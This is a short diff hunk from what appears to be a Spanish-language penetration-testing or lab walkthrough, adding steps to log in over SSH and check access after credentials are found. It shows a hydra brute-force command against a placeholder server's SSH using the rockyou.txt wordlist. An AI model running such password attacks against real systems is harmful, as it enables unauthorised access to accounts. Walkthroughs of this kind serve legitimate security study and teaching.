@@ -13,4 +13,7 @@
 ++ hydra -l ubuntu -P rockyou.txt ssh://<ip_servidor>
 ++ Las credenciales del usuario ubuntu han sido encontradas
 ++ Ingresamos las mismas usando:
-++ ssh <usuario@<ip_servidor>
+--- ssh <usuario@<ip_servidor>
+++ Comprobamos el acceso mediante:
+--- whoami
+--- groups
